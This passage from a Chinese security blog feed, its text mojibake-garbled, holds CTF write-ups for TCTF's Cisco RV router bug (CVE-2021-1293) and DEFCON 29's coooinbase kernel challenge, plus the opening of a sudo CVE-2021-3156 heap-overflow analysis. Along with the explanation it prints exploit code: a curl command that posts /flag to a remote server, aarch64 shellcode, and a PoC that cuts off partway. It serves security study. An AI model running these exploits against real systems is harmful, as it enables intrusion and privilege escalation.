ç®€å•æ’¸äº†ä¸€ä¸ªã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.....</span><br><span class="line">base = ip2long(<span class="string">&#x27;172.31.0.0&#x27;</span>)</span><br><span class="line">m = login()</span><br><span class="line">req_vip(m, base + <span class="number">2</span>)</span><br><span class="line">sport = randint(<span class="number">1024</span>, <span class="number">65535</span>)</span><br><span class="line">ip = IP(src=<span class="string">&#x27;172.31.0.2&#x27;</span>, dst=<span class="string">&#x27;10.1.1.1&#x27;</span>)</span><br><span class="line">SYN = TCP(sport=sport, dport=<span class="number">80</span>, flags=<span class="string">&#x27;S&#x27;</span>, seq=<span class="number">1000</span>)</span><br><span class="line">s = raw(ip / SYN)</span><br><span class="line">route(m, s)</span><br><span class="line">data = recv_packet(m)</span><br><span class="line">ack = IP(data)</span><br><span class="line">a = TCP(sport=sport, dport=<span class="number">80</span>, flags=<span class="string">&#x27;A&#x27;</span>, seq=ack.ack + <span class="number">1</span>, ack=ack.seq + <span class="number">1</span>)</span><br><span class="line">route(m, raw(ip / a))</span><br><span class="line">d = TCP(sport=sport, dport=<span class="number">80</span>, flags=<span class="string">&#x27;PA&#x27;</span>, seq=<span class="number">1001</span>, ack=ack.seq + <span class="number">1</span>) / payload.encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">route(m, raw(ip / d))</span><br><span class="line"></span><br><span class="line">m.interactive()</span><br></pre></td></tr></table></figure><p>æœ€ååˆ©ç”¨ <code>curl -d @/flag server:port</code> çš„å‘½ä»¤è·å–äº†flag ï¼ˆå¦å¤–ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œ å¦‚æœå­˜åœ¨ç©ºæ ¼çš„è¯å°±ä¼šè¢«æˆªæ–­ï¼Œå› æ­¤è¿™é‡Œç”¨äº† ${IFS} æ›¿æ¢äº†ç©ºæ ¼ï¼‰</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706143147.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706143147.png" style="zoom:50%;" /></a><p><a href="https://github.com/WinMin/WinMin.github.io/blob/master/attachments/2021-TCTF-quals/RV/RV.py">åˆ©ç”¨è„šæœ¬</a>ï¼š</p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/RV/RV.py">http://bestwing.me/attachments/2021-TCTF-quals/RV/RV.py</a></p><p>binary idb</p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/RV/mini/_httpd.idb">http://bestwing.me/attachments/2021-TCTF-quals/RV/mini\_httpd.idb</a></p><h3 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><p>è¯¥æ¼æ´å·²ç»ä¿®å¤ï¼Œ strcpy å‡½æ•°æ¢æˆäº† strncpy å‡½æ•°ï¼Œ å¦‚æœå—åˆ°æ¼æ´å½±å“è¯·å°½å¿«æ›´æ–°å›ºä»¶ç‰ˆæœ¬åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv160-260-rce-XZeFkNHf">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv160-260-rce-XZeFkNHf</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> CVE-2021-1293 </tag>
            
            <tag> TCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DEFCON 29 CTF Qualifier  coooinbase and coooinbase-kernel Write-up</title>
      <link href="DEFCON-29-CTF-Qualifier-coooinbase-and-coooinbase-kernel-Write-up.html"/>
      <url>DEFCON-29-CTF-Qualifier-coooinbase-and-coooinbase-kernel-Write-up.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="DEFCON-29-CTF-Qualifier-coooinbase-amp-amp-coooinbase-kernel-Write-up"><a href="#DEFCON-29-CTF-Qualifier-coooinbase-amp-amp-coooinbase-kernel-Write-up" class="headerlink" title="DEFCON 29 CTF Qualifier:  coooinbase &amp;&amp; coooinbase-kernel Write-up"></a>DEFCON 29 CTF Qualifier:  coooinbase &amp;&amp; coooinbase-kernel Write-up</h2><h3 id="coooinbase"><a href="#coooinbase" class="headerlink" title="coooinbase"></a>coooinbase</h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>a simple service backed by special hardware for buying bitcoin: our beta testing server is live at <a href="http://52.6.166.222:4567/">http://52.6.166.222:4567</a> - this time attack the kernel!</p></blockquote><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504004319.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504004319.png"></a></p><p>å›¾ï¼š1 é¢˜ç›®æœåŠ¡é¦–é¡µ</p><p>ä»é¢˜ç›®çš„é¦–é¡µçš„ <code>custom hardware</code> å¤„å¯ä»¥ä¸‹åˆ°é¢˜ç›®çš„å›ºä»¶åŒ…ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004611006.png" title="image-20210504004611006" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004611006.png" alt="image-20210504004611006"></a></p><p>å›¾: 2 ä¸‹è½½é¢˜ç›®å›ºä»¶</p><p>å¯ä»¥çœ‹åˆ°å›ºä»¶åŒ…é‡ŒåŒ…ä»¥ä¸‹æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">âœ  coooinbase tar -xvzf src</span><br><span class="line">x dist&#x2F;</span><br><span class="line">x dist&#x2F;x.rb</span><br><span class="line">x dist&#x2F;coooinbase.bin</span><br><span class="line">x dist&#x2F;rootfs.img</span><br><span class="line">x dist&#x2F;x.sh</span><br><span class="line">x dist&#x2F;x.html</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>x.rb</code> æ˜¯ web çš„åç«¯æœåŠ¡ï¼Œæˆ‘ä»¬éœ€è¦å…³æ³¨çš„ä»£ç é€»è¾‘å¦‚å›¾:</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004932474.png" title="image-20210504004932474" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004932474.png" alt="image-20210504004932474"></a></p><p>å›¾3ï¼š x.rb ä»£ç </p><p>é˜…è¯»ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸€ä¸‹å‡ ç‚¹ï¼š</p><ol><li>å½“æˆ‘ä»¬è®¿é—® <code>/buy</code> api çš„æ—¶å€™ï¼Œ ä»£ç ä¼šè¯·æ±‚ <code>HTTP_POST</code> åœ°å€å¤„çš„çš„ <code>/gen-bson</code> api, å½“è·å–åˆ° <code>/gen-bson</code> api è¿”å›çš„æ•°æ®åï¼Œä¼šå°†æ•°æ®å†™å…¥ <code>pwn</code> æ–‡ä»¶ä¸­ï¼Œç„¶åä»¥é‡å®šå‘çš„å½¢å¼å–‚å…¥ <code>./x.sh</code> æ–‡ä»¶</li><li><code>/gen-bson</code> è¿™ä¸ª api ä¼šè°ƒç”¨ <code>valid_credit_card</code> å’Œ <code>valid_association</code> å‡½æ•°åˆ†åˆ«æ ¡éªŒå¡«å…¥çš„ cardnumber çš„åˆæ³•æ€§ã€‚ ä½†æ˜¯å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°å‡ä¼šè°ƒç”¨ <code>to_s.gusb(/\D/, &#39;&#39;)</code> å°†ä¼ å…¥çš„ <code>number</code> å˜é‡ä¸­çš„éæ•°å­—ç»™å»æ‰ï¼Œä½†æ˜¯åœ¨ 44 -å¤„çš„ <code>number</code> å´æ˜¯ä»ç„¶å¸¦æœ‰å­—ç¬¦ä¸²çš„ï¼Œå› æ­¤æ­¤å¤„æˆ‘ä»¬å¯ä»¥ä¼ å…¥å…¶ä»–éæ•°å­—çš„å€¼ ï¼ˆ6011000000000004 è¿™ä¸ªcardnmumber å¯ä»¥è¿‡æ ¡éªŒï¼‰</li><li><code>gen-bson</code> åœ¨45-46 è¡Œå¤„ä¼šå°†å‚æ•°è½¬æˆ bson æ ¼å¼ï¼Œä¸” base64 ç¼–ç ï¼Œ ç„¶åè¿”å›</li></ol><p>ï¼ˆæ³¨ï¼š æ­¤å¤„è¿˜æœ‰æœ‰ä¸ªç‚¹ï¼Œæˆ‘åœ¨ä¸€å¼€å§‹çš„æ—¶å€™æ²¡æ³¨æ„åˆ°ï¼Œæš‚ä¸”ä¸æï¼‰</p><p><code>x.sh</code> çš„ä»£ç å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout 1 qemu-system-aarch64 -machine virt -cpu cortex-a57 -smp 1 -m 64M -nographic -serial mon:stdio -monitor none -kernel coooinbase.bin -drive <span class="keyword">if</span>=pflash,format=raw,file=rootfs.img,unit=1,<span class="built_in">readonly</span></span><br></pre></td></tr></table></figure><p>ç”¨ qemu è·‘èµ·ä¸€ä¸ªæœåŠ¡ï¼Œ å†…æ ¸ä¸º: <code>coooinbase.bin</code> ä»¥åŠæœ‰å¯¹åº”çš„ rootfs.img , é€šè¿‡ä»¥ä¸‹å‘½ä»¤å¯ä»¥å°†æ–‡ä»¶ç³»ç»Ÿ mount å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modprobe nbd max_part&#x3D;8</span><br><span class="line">qemu-nbd --connect&#x3D;&#x2F;dev&#x2F;nbd0 .&#x2F;rootfs.img</span><br><span class="line">mkdir rootfs</span><br><span class="line">mount &#x2F;dev&#x2F;nbd0 rootfs</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° æ–‡ä»¶ç³»ç»Ÿä¸­æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  rootfs ls</span><br><span class="line">bin  flg  run</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ bin å’Œ run , é€šè¿‡é€†å‘å‘ç°æ˜¯ä¸€æ ·çš„æ–‡ä»¶ï¼Œ flg æ˜¯flag æ–‡ä»¶</p><p>çŒœæµ‹ bin ï¼ˆrun) å°±æ˜¯è¦ pwn çš„ç”¨æˆ·æ€ç¨‹åºï¼Œ é€šè¿‡å¯åŠ¨å‘½ä»¤ï¼Œæˆ‘ä»¬çŸ¥é“æ¶æ„ä¸º aarch64, cpu ä¸º cortex-a57, æˆ‘ä»¬ä½¿ç”¨ IDA  Pro æ‰“å¼€è¯¥æ–‡ä»¶ï¼Œ è®¾ç½®å¦‚ä¸‹ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012341867.png" title="image-20210504012341867" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012341867.png" alt="image-20210504012341867"></a></p><p>å›¾4ï¼šIDA åŠ è½½</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012534460.png" title="image-20210504012534460" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012534460.png" alt="image-20210504012534460"></a></p><p>å›¾4ï¼šIDAåˆ†ææˆªå›¾</p><p>ç„¶åå°±å¿…ç„¶å‘ç° IDA ä»€ä¹ˆå‡½æ•°éƒ½æ²¡æœ‰åˆ†æå‡ºæ¥ï¼Œ æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ­£ä¸‹æˆ‘ä»¬çš„ IDBï¼Œä¿®å¤å‡ºå‡½æ•°</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504014746398.png" title="image-20210504014746398" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504014746398.png" alt="image-20210504014746398"></a></p><p>å›¾5ï¼šä¿®å¤åçš„ IDA æˆªå›¾</p><p>åœ¨ <code>bsion_find_string</code> ä¸­æˆ‘ä»¬å‘ç°äº†ä¸€å¤„åŠ¨æ€åˆ†é…æ ˆç©ºé—´çš„é€»è¾‘</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504015258789.png" title="image-20210504015258789" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504015258789.png" alt="image-20210504015258789"></a></p><p>å›¾5ï¼šåŠ¨æ€åˆ†é…æ ˆç©ºé—´</p><p>åœ¨åœ°å€ 0xB6C å¤„ï¼Œ X1 ä¸ºä¼ å…¥çš„å­—ç¬¦ä¸²å¤§å°ï¼Œ æ­¤å¤„åˆ¤æ–­éœ€è¦åŠ¨æ€åˆ†é…çš„æ ˆçš„å¤§å° ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504025826791.png" title="image-20210504025826791" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504025826791.png" alt="image-20210504025826791"></a></p><p>å›¾5ï¼šmapping æˆªå›¾</p><p>ä½†æ˜¯è¿™é‡Œå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œ è¿™ä¸ªæ²¡æœ‰åˆ¤æ–­ä¼ å…¥çš„å­—ç¬¦ä¸²å¤§å°æ˜¯ä¸æ˜¯å¤ªå¤§ï¼Œå¦‚æœå¤ªå¤§çš„è¯ï¼Œ ä¾‹å¦‚æˆ‘ä¼ å…¥ 0xf000 å¤§å°çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæ­¤æ—¶å°†åˆ†é… 0xf000 å¤§å°çš„æ ˆï¼Œ å³ <code>SP = SP - 0xffff</code>  , ç”±äºæ ˆåœ¨ç¨‹åºä»£ç æ®µçš„ä¸‹æ–¹ï¼Œæ­¤æ—¶å°†å¯¼è‡´æ ˆä¼šè¢«åˆ†é…åˆ°ä»£ç æ®µä¸Šï¼Œè€Œä¸”ç”±äºæ˜¯ qemu å¯åŠ¨çš„ç¨‹åºï¼Œæ‰€æœ‰çš„æ®µéƒ½æ˜¯å¯å†™å¯æ‰§è¡Œçš„ã€‚</p><p>å› æ­¤ï¼Œè¿™ä¸ªé¢˜ç›®çš„æ€è·¯å¦‚ä¸‹ï¼š</p><p>æ„é€ è¶³å¤Ÿé•¿çš„å­—ç¬¦ä¸²ï¼Œå°†æ ˆåˆ†é…ä¹‹åå°†æ‰§è¡Œçš„ä»£ç æ®µä½ç½®ï¼Œ å†™å…¥ shellcode ç„¶åæœ€åæ‰§è¡Œ shellcode. ç”±äºç¨‹åºæœ‰ç°æˆ open read write çš„å‡½æ•°ï¼Œ å› æ­¤ shellcode ç¼–å†™æ–¹ä¾¿äº†è®¸å¤šï¼Œæˆ‘ä»¬åªéœ€ç›´æ¥ call å‡½æ•°å³å¯ã€‚</p><p>shellcodeï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag_path_name = <span class="number">0x715</span></span><br><span class="line">open_addr = <span class="number">0x340</span></span><br><span class="line">read_addr = <span class="number">0x34C</span></span><br><span class="line">write_addr = <span class="number">0x310</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># open</span></span><br><span class="line">shellcode = pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x0&#x27;</span>:flag_path_name, <span class="string">&#x27;x1&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;x12&#x27;</span>:open_addr&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read</span></span><br><span class="line"></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x1&#x27;</span>:<span class="number">0xFFFF000000088858</span>, <span class="string">&#x27;x2&#x27;</span>:<span class="number">0x50</span>, <span class="string">&#x27;x12&#x27;</span>:read_addr&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x0&#x27;</span>:<span class="number">0x715</span>, <span class="string">&#x27;x12&#x27;</span>:write_addr&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line">print(asm(shellcode))</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œä¼šå‡ºç°ä¸€ä¸ªå‘ç‚¹:</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504030941428.png" title="image-20210504030941428" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504030941428.png" alt="image-20210504030941428"></a></p><p>ruby to bson çš„æ—¶å€™å¾—æ˜¯ UTF-8 çš„å­—ç¬¦é›†ï¼Œè¿™æ„å‘³è¿™åœ¨ x.rb ä»£ç ä¸­çš„ï¼ˆè§å›¾4ï¼‰ 45 æ˜¯è¿‡ä¸å»çš„ï¼Œ ç„¶ååœ¨æ¯”èµ›çš„æ—¶å€™ä¸€åº¦é™·å…¥è¯•å›¾æŠŠæˆ‘çš„ shellcode çš„ä¿®æ”¹ä¸ºå…¨ä¸º UTF-8 å­—ç¬¦é›†çš„è‰°è‹¦å·¥ä½œä¸­ã€‚ ç„¶å peanuts å‘ç°ï¼Œ  <code>HTTP_POST</code>  æ˜¯ç”± HTTP header ä¸­çš„ HOSTå­—æ®µæ§åˆ¶çš„ï¼Œ è¿™ä»¥ä¸ºæˆ‘ä»¬ä¸éœ€è¦é€šè¿‡åç«¯è‡ªèº«çš„ <code>/gen_bson</code> api ä¼ å…¥æ„é€ å¥½çš„ payload ï¼Œ æˆ‘ä»¬åªéœ€æ­å»ºæˆ‘ä»¬è‡ªå·±çš„æœåŠ¡ï¼Œ å½“æ¥æ”¶åˆ° <code>/gen_bson</code> è¯·æ±‚åï¼Œ ä¼ å›æˆ‘ä»¬çš„ payloadã€‚</p><h2 id="coooinbase-kernel"><a href="#coooinbase-kernel" class="headerlink" title="coooinbase-kernel"></a>coooinbase-kernel</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035715437.png" title="image-20210504035715437" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035715437.png" alt="image-20210504035715437"></a></p><p>å†…æ ¸å®ç°äº†å‡ ä¸ªsyscall</p><p>å…¶ä¸­ write é™åˆ¶äº†è¯»å–çš„åœ°å€çš„èŒƒå›´</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035800048.png" title="image-20210504035800048" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035800048.png" alt="image-20210504035800048"></a></p><p>ä½†æ˜¯ read ä¸­æ²¡æœ‰é™åˆ¶å†™å…¥çš„åœ°å€çš„èŒƒå›´</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504035843.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504035843.png"></a></p><p>å› æ­¤è¿™ä¸ªé¢˜çš„æ€è·¯ä¸ºï¼š</p><p>åœ¨å·²ç»å®Œæˆçš„ç”¨æˆ·æ€ä»»æ„ä»£ç æ‰§è¡Œçš„åŸºç¡€ä¸Š</p><ol><li>open bin æ–‡ä»¶ï¼Œæ‰¾åˆ°ä¸€ä¸ªæ— æ„ä¹‰çš„ä»£ç </li><li>lseek åˆ°è¯¥å¤„</li><li>read è¯¥å¤„çš„ä»£ç </li><li>é€šè¿‡ read å‘å†…æ ¸çš„ write çš„åˆ¤æ–­åœ°å€èŒƒå›´çš„åœ°æ–¹å†™æ‰</li><li>è°ƒç”¨ write å°†å†…æ ¸åœ°å€ä¸­çš„ flag æ‰“å°å‡º</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># open</span></span><br><span class="line">shellcode = pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x0&#x27;</span>:<span class="number">0x715</span>, <span class="string">&#x27;x1&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;x12&#x27;</span>:<span class="number">0x340</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fseek</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x1&#x27;</span>:<span class="number">0x510</span>, <span class="string">&#x27;x2&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;x12&#x27;</span>:<span class="number">0x364</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x1&#x27;</span>:<span class="number">0xFFFF000000082A5C</span><span class="number">-4</span>, <span class="string">&#x27;x2&#x27;</span>:<span class="number">8</span>, <span class="string">&#x27;x12&#x27;</span>:<span class="number">0x34C</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&quot;MOV             X0, X6\n&quot;</span></span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x2&#x27;</span>:<span class="number">0x50</span>, <span class="string">&#x27;x6&#x27;</span>:<span class="number">0xFFFF000000088858</span>,<span class="string">&#x27;x12&#x27;</span>:<span class="number">0x310</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;MOV X0, X6\n&#x27;</span></span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Defcon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3156 sudo heap-overflow æ¼æ´åˆ†æ</title>
      <link href="CVE-2021-3156-analysis.html"/>
      <url>CVE-2021-3156-analysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="æ¼æ´èƒŒæ™¯"><a href="#æ¼æ´èƒŒæ™¯" class="headerlink" title="æ¼æ´èƒŒæ™¯"></a>æ¼æ´èƒŒæ™¯</h2><p>1 æœˆ26 æ—¥çš„æ—¶å€™ï¼Œ æœ‰æ–‡ç« æŠ«éœ²äº† sudo ä»£ç ä¸­å­˜åœ¨ å †ç¼“å†²åŒºæº¢å‡ºï¼Œäºæ˜¯èŠ±äº†æ¼«é•¿çš„æ—¶é—´å°è¯•å†™ç›¸å…³åˆ©ç”¨, æœ¬æ–‡ä»¥å­¦ä¹ ç¬”è®°ä¸ºä¸»ã€‚</p><p>å®Œæ•´åˆ©ç”¨å¯è§ï¼š</p><p><a href="https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9">https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9</a></p><blockquote><p>The Qualys Research Team has discovered a heap overflow vulnerability in sudo, a near-ubiquitous utility available on major Unix-like operating systems. Any unprivileged user can gain root privileges on a vulnerable host using a default sudo configuration by exploiting this vulnerability.</p><p>Sudo is a powerful utility thatâ€™s included in most if not all Unix- and Linux-based OSes. It allows users to run programs with the security privileges of another user. The vulnerability itself has been hiding in plain sight for nearly 10 years. It was introduced in July 2011 (commit 8255ed69) and affects all legacy versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1 in their default configuration.</p><p>Successful exploitation of this vulnerability allows any unprivileged user to gain root privileges on the vulnerable host. Qualys security researchers have been able to independently verify the vulnerability and develop multiple variants of exploit and obtain full root privileges on Ubuntu 20.04 (Sudo 1.8.31), Debian 10 (Sudo 1.8.27), and Fedora 33 (Sudo 1.9.2). Other operating systems and distributions are also likely to be exploitable.</p></blockquote><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¿™é‡Œä»¥ sudo 1.8.31 ç‰ˆæœ¬ä½œä¸ºåˆ†æç›®æ ‡ã€‚ ubuntu 20.04.1 ä½œä¸ºåˆ†æç¯å¢ƒ</p><p>PoC:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> obufsz = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">char</span> obuf[obufsz];</span><br><span class="line"><span class="built_in">memset</span>(obuf, <span class="string">&#x27;B&#x27;</span>, <span class="keyword">sizeof</span>(obuf));</span><br><span class="line">obuf[obufsz<span class="number">-2</span>] = <span class="number">0x5c</span>;</span><br><span class="line">obuf[obufsz<span class="number">-1</span>] = <span class="number">0x00</span>;</span><br><span class="line"><span class="keyword">char</span> *args[] = &#123;</span><br><span class="line"><span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line"><span class="string">&quot;-s&quot;</span>,</span><br><span class="line">obuf,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *extra_args[] = &#123;</span><br><span class="line"><span class="string">&quot;X/X\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;a&quot;</span>,</span><br><span class="line"><span class="string">&quot;LC_MESSAGES=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>,</span><br><span class="line"><span 